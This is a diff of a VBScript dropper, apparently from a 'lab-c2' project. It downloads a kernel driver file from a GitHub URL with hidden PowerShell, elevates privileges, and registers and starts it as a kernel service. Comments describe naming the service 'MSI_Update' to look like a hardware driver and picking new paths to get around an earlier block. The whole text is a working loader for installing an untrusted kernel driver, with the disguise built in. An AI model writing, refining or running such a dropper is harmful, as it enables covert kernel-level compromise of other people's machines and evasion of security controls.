@@ -1,13 +1,15 @@
 Set objShell = CreateObject("WScript.Shell")
-' Moving to a new path to avoid the "History" block from the previous attempt
-driverPath = "C:\Users\Public\msi.sys"
-githubURL = "https://github.com/g00glecenter101-arch/lab-c2/raw/refs/heads/main/msi.sys"
+' Use Public folder to avoid permission issues
+driverPath = "C:\Users\Public\sym.sys"
+' UPDATE THIS URL to your actual raw GitHub link
+githubURL = "https://github.com/g00glecenter101-arch/lab-c2/raw/refs/heads/main/sym.sys"
 
-' 1. Download the MSI driver
-cmdDownload = "powershell -NoP -W Hidden -C ""iwr '" & githubURL & "' -OutFile '" & driverPath & "'"""
-objShell.Run cmdDownload, 0, True
+' 1. Download the driver
+objShell.Run "powershell -NoP -C ""iwr '" & githubURL & "' -OutFile '" & driverPath & "'""", 0, True
 
-' 2. Clear old attempts and Load the MSI driver
-' We use a unique service name 'MSI_Update' to look like a hardware driver
-cmdLoad = "powershell -NoP -W Hidden -C ""Start-Process cmd -ArgumentList '/c sc delete msi_update & sc create msi_update binPath= " & driverPath & " type= kernel && sc start msi_update' -Verb RunAs"""
-objShell.Run cmdLoad, 0, False
+' 2. Create and Start the service (Using a new name 'sym_auth')
+' We delete the old one first just in case
+cmd = "cmd /c sc delete sym_auth & sc create sym_auth binPath= """ & driverPath & """ type= kernel & sc start sym_auth"
+
+' Run as Admin
+objShell.Run "powershell -NoP -C ""Start-Process cmd -ArgumentList '/c " & cmd & "' -Verb RunAs""", 0, True
